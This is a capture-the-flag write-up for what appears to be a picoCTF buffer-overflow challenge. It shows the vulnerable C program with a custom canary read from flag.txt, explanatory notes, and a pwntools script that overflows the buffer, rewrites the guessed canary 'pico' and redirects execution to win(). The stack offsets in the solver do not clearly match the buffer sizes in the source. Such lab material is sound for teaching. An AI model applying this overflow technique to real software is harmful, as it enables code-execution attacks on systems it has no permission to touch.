## Source code ( full )

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BUFSIZE 112
#define CANARY_SIZE 4
#define FLAGSIZE 64

char global_canary[CANARY_SIZE];

void win() {
    char flag[FLAGSIZE];
    FILE *f = fopen("CodeBank/flag.txt", "r");

    if (!f) {
        puts("Missing flag.txt.");
        exit(0);
    }

    fgets(flag, FLAGSIZE, f);
    puts(flag);
}

void load_canary() {
    FILE *f = fopen("CodeBank/flag.txt", "r");

    if (!f) {
        puts("Missing flag.txt.");
        exit(0);
    }

    fread(global_canary, 1, CANARY_SIZE, f);
    fclose(f);
}

void vuln() {
    char local_canary[CANARY_SIZE];
    char buf[BUFSIZE];
    char input[BUFSIZE];
    int count, i = 0;

    memcpy(local_canary, global_canary, CANARY_SIZE);

    printf("How many bytes?\n> ");
    while (i < BUFSIZE && read(0, &input[i], 1) == 1 && input[i] != '\n')
        i++;

    sscanf(input, "%d", &count);

    printf("Input> ");
    read(0, buf, count);

    if (memcmp(local_canary, global_canary, CANARY_SIZE) != 0) {
        puts("***** Stack Smashing Detected *****");
        exit(0);
    }

    puts("Ok... Now Where's the flag?");
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setresgid(getegid(), getegid(), getegid());

    load_canary();
    vuln();
    return 0;
}


```

>[!note]- Explanation
> - Program uses a **custom canary**, loaded from the first 4 bytes of `flag.txt`  
> - `load_canary()` reads those bytes into `global_canary`, then copied to stack (`local_canary`)  
> - Since this is picoCTF, flag format is predictable → first 4 bytes = `pico`  
> - So we can **guess the canary value** and bypass the check:
>   - `memcmp(local_canary, global_canary)`  
>
> - Overflow still works like usual:
>   - overflow `buf`
>   - rewrite canary with correct value (`pico`)
>   - overwrite return address → jump to `win()`  
>
> - Input flow:
>   - first input = `count` (how many bytes to read)
>   - then `read(0, buf, count)` → controls overflow length  
>   - we set `count` big enough to reach return address  
>
> - Key point:
>   - find offset to canary + return address  
>   - include correct canary in payload to avoid crash

## Solver.py

``` python
from pwn import *

elf = ELF('./35')
p = process('./35')

win = elf.sym['win']
canary = b"pico"

buf_padding = 0x286 - 0x10       # fill: offset buf -> canary
post_canary_padding = 0xc

payload  = b"A" * buf_padding
payload += canary
payload += b"B" * post_canary_padding
payload += b"C" * 4     # saved EBP
payload += p32(win)

p.sendlineafter(b'How many bytes?\n> ', str(len(payload)).encode())
p.sendafter(b'Input> ', payload)

p.interactive()
```
>[!note]- Explanation
> - We first overflow from `buf` **up to the canary**, because we must preserve it before going further  
> - From the disassembly:
>   - buffer starts at `ebp-0x286`
>   - canary is stored at `ebp-0x10`
>     
> - So the offset from **buffer → canary** is:
>   - `0x286 - 0x10`
> - That is why:
>   - `buf_padding = 0x286 - 0x10`
> - After reaching the canary, we write the correct value:
>   - `canary = b"pico"`
> - Then we continue with the remaining stack space between canary and saved EBP:
>   - `post_canary_padding = 0xc`
> - After that:
>   - overwrite saved EBP (`4 bytes`)
>   - overwrite return address with `p32(win)`
>
> - Final payload layout:
>   - `A * (buf -> canary)`
>   - correct canary (`pico`)
>   - padding to saved EBP
>   - fake saved EBP
>   - `win()` address
